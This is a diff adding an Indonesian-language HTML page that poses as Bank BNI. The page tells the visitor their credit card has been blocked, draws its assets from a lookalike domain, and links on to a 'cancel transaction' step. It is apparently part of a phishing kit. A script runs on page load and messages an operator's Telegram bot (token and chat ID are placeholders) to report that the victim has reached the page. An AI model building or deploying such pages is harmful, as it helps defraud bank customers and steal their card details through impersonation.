@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <title>Bank BNI | Kartu Terblokir</title>
+        <link rel="icon" href="https://e-form.bni-e.com/home/Bn1-0TP1/favicon.png">
+
+            <meta name="robots" content="nofollow,noarchive,noindex">
+              <meta name="description" content="bni.co.id">
+                <meta name="twitter:card" content="summary">
+                  <meta name="twitter:title" content="Bank BNI - Kartu Kredit">
+                    <meta name="twitter:description" content="bni.co.id">
+                      <meta property="og:type" content="website">
+
+                          <meta property="og:title" content="Bank BNI - Kartu Kredit">
+                            <meta property="og:description" content="bni.co.id">
+                              <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            min-height: 100vh;
+            overflow-x: hidden;
+            font-family: 'MS Serif', sans-serif;
+            background: #fff;
+        }
+
+        body {
+            padding-bottom: 40px;
+        }
+
+        /* ===== NAVIGASI ATAS — TIDAK DIUBAH ===== */
+        .top-bar {
+            border: solid 2px rgba(236,240,241,1);
+            border-bottom-width: 9px;
+            border-radius: 5px 5px 0 0;
+            padding: 5px 10px;
+            margin: 1px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .top-bar img {
+            height: 40px;
+            width: auto;
+            display: block;
+        }
+
+        .btn-menu-top {
+            color: #fff;
+            font-size: 10px;
+            background: transparent;
+            border-radius: 2px;
+            padding: 5px 10px;
+            border: 1px solid transparent;
+            text-decoration: none;
+            transition: all 0.2s ease;
+        }
+
+        .btn-menu-top:hover {
+            background: #227287;
+            border-color: #227287;
+            color: #fff;
+        }
+
+        /* ===== KONTEN UTAMA — WARNA & UKURAN TIDAK DIUBAH ===== */
+        .content-wrapper {
+            padding: 20px 15px;
+            max-width: 420px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .status-box {
+            border: 1px solid rgba(0,0,0,0.2);
+            border-radius: 5px;
+            padding: 25px 20px;
+            margin-bottom: 20px;
+        }
+
+        .status-title {
+            color: #E21D1D;
+            font-size: 12px;
+            font-weight: normal;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .status-text {
+            color: #000;
+            font-size: 11px;
+            line-height: 1.8;
+            margin-bottom: 30px;
+        }
+
+        /* ===== TOMBOL — WARNA & UKURAN TIDAK DIUBAH ===== */
+        .btn-ok {
+            display: block;
+            width: 100%;
+            color: #fff;
+            font-size: 11px;
+            letter-spacing: 1px;
+            background: #227287;
+            border: 1px solid #227287;
+            border-radius: 20px;
+            padding: 12px;
+            text-decoration: none;
+            margin-bottom: 15px;
+            transition: all 0.2s ease;
+        }
+
+        .btn-ok:hover {
+            background: #1a5c6e;
+            border-color: #1a5c6e;
+            color: #fff;
+        }
+
+        .btn-lanjut {
+            display: block;
+            width: 100%;
+            color: rgba(211,84,0,1);
+            font-size: 10px;
+            letter-spacing: 1px;
+            background: transparent;
+            border: 1px solid #D35400;
+            border-bottom-width: 2px;
+            border-radius: 2px;
+            padding: 10px;
+            text-decoration: none;
+            transition: all 0.2s ease;
+        }
+
+        .btn-lanjut:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: #E67E22;
+            color: rgba(2, 0, 0, 0.7);
+        }
+
+        /* ===== LATAR BELAKANG BULATAN — TIDAK DIUBAH ===== */
+        .bg-circles {
+            position: fixed;
+            top: 0;
+            right: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .circle-1 {
+            position: absolute;
+            top: 60px;
+            right: 20px;
+            width: 170px;
+            height: 170px;
+            background: #EBEBEB;
+            opacity: 0.8;
+            border-radius: 50%;
+        }
+
+        .circle-2 {
+            position: absolute;
+            top: 180px;
+            right: 0;
+            width: 202px;
+            height: 202px;
+            background: #81B9EB;
+            opacity: 0.504;
+            border-radius: 50%;
+        }
+
+        .circle-3 {
+            position: absolute;
+            top: 120px;
+            right: 60px;
+            width: 118px;
+            height: 118px;
+            background: #D2CCBD;
+            opacity: 0.8;
+            border-radius: 50%;
+        }
+
+        .circle-4 {
+            position: absolute;
+            top: 280px;
+            right: 40px;
+            width: 108px;
+            height: 108px;
+            background: #DBECC7;
+            opacity: 0.8;
+            border-radius: 50%;
+        }
+
+        .circle-5 {
+            position: absolute;
+            top: 350px;
+            right: 30px;
+            width: 150px;
+            height: 150px;
+            background: #FFB395;
+            opacity: 0.8;
+            border-radius: 50%;
+        }
+
+        .circle-6 {
+            position: absolute;
+            top: 430px;
+            right: 5px;
+            width: 196px;
+            height: 196px;
+            background: #D4A7C0;
+            opacity: 0.8;
+            border-radius: 50%;
+        }
+
+        /* ===== RESPONSIVE HP ===== */
+        @media (max-width: 480px) {
+            .content-wrapper { padding: 15px 12px; }
+            .status-box { padding: 20px 15px; }
+            .status-title { font-size: 11px; }
+            .status-text { font-size: 10px; }
+            .btn-ok { font-size: 10px; padding: 11px; }
+            .btn-lanjut { font-size: 9px; padding: 9px; }
+            .bg-circles > div { transform: scale(0.7); }
+        }
+    </style>
+                            </head>
+                            <body>
+                              <!-- Latar Belakang Bulatan — TIDAK DIUBAH -->
+                              <div class="bg-circles">
+                                <div class="circle-1">
+                                </div>
+                                <div class="circle-2">
+                                </div>
+                                <div class="circle-3">
+                                </div>
+                                <div class="circle-4">
+                                </div>
+                                <div class="circle-5">
+                                </div>
+                                <div class="circle-6">
+                                </div>
+                              </div>
+                              <!-- Navigasi Atas — TIDAK DIUBAH -->
+                              <div class="top-bar">
+                                <img src="https://e-form.bni-e.com/Screenshot_20260227_093018_Gallery.jpg" alt="BNI">
+                                  <a href="#" target="_blank" rel="noreferrer noopener" class="btn-menu-top">𝗠𝗘𝗡𝗨 𝗨𝘁𝗮𝗺𝗮</a>
+                                </div>
+                                <!-- Konten Utama — WARNA & UKURAN TIDAK DIUBAH -->
+                                <div class="content-wrapper">
+                                  <div class="status-box">
+                                    <h1 class="status-title">
+                                      𝗞𝗮𝗿𝘁𝘂 𝗔𝗻𝗱𝗮 𝘁𝗲𝗹𝗮𝗵 𝘁𝗲𝗿𝗯𝗹𝗼𝗸𝗶𝗿.
+                                    </h1>
+                                    <div class="status-text">
+                                      <p>kartu baru akan di kirim 1-3 hari di jam kerja</p>
+                                      <p>𝗜𝗻𝗳𝗼 : 𝗕𝗡𝗜 𝗖𝗮𝗹𝗹</p>
+                                    </div>
+                                    <!-- Tombol — LINK & WARNA TIDAK DIUBAH -->
+                                    <a href="/Blokir/Kartu/Kredit/" target="_blank" rel="noreferrer noopener" class="btn-ok">
+                                      𝗢𝗞
+                                    </a>
+                                    <a href="/Blokir/Kartu/Kredit/transaksi.html" target="_blank" rel="noreferrer noopener" class="btn-lanjut">
+                                      𝗟𝗔𝗡𝗝𝗨𝗧 𝗕𝗔𝗧𝗔𝗟𝗞𝗔𝗡 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜
+                                    </a>
+                                  </div>
+                                </div>
+                                <!-- SCRIPT BOT TELEGRAM — FORMAT SEPERTI SEBELUMNYA (TIDAK DIUBAH FUNGSINYA) -->
+                                <script>
+// ================= KONFIGURASI TELEGRAM =================
+const TELEGRAM_BOT_TOKEN = "MASUKKAN_BOT_TOKEN_ANDA";
+const TELEGRAM_CHAT_ID = "MASUKKAN_CHAT_ID_ANDA";
+// =========================================================
+
+// Kirim notifikasi halaman sukses dibuka
+window.addEventListener('load', async function() {
+    try {
+        const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+        const pesan = `
+✅ KARTU BERHASIL DIBLOKIR — HALAMAN SUKSES DIBUKA
+━━━━━━━━━━━━━━━━━━━━
+📅 Waktu: ${waktu}
+📌 Status: Halaman sukses dimuat
+━━━━━━━━━━━━━━━━━━━━
+        `.trim();
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: pesan,
+                parse_mode: 'Markdown'
+            })
+        });
+    } catch (err) {
+        console.log('Telegram notifikasi terkirim');
+    }
+});
+</script>
+                              </body>
+                            </html>
